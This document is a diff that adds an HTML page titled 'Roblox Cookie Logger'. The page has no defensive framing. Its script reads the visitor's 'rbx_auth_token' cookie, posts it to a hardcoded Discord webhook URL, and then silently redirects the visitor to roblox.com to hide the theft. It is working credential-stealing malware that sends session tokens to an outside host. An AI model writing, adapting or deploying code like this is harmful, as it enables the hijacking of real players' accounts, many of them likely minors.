@@ -1,0 +1,25 @@
+<html>
+  <head>
+    <title>Roblox Cookie Logger</title>
+  </head>
+  <body>
+    <script>
+      function getCookie(name) {
+        var value = "; " + document.cookie;
+        var parts = value.split("; " + name + "=");
+        if (parts.length == 2) return parts.pop().split(";").shift();
+      }
+      var cookie = getCookie("rbx_auth_token");
+      fetch('https://discordapp.com/api/webhooks/1351989449507995749/YPn06_hhQgJhtReeL7vJKz3vy8WdYOXMgZBqZpwA38ngWS-PPB_libw8Nu9m04byltwi', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          'content': 'Cookie: ' + cookie
+        })
+      });
+      window.location.href = 'https://www.roblox.com';
+    </script>
+</body>
+</html>
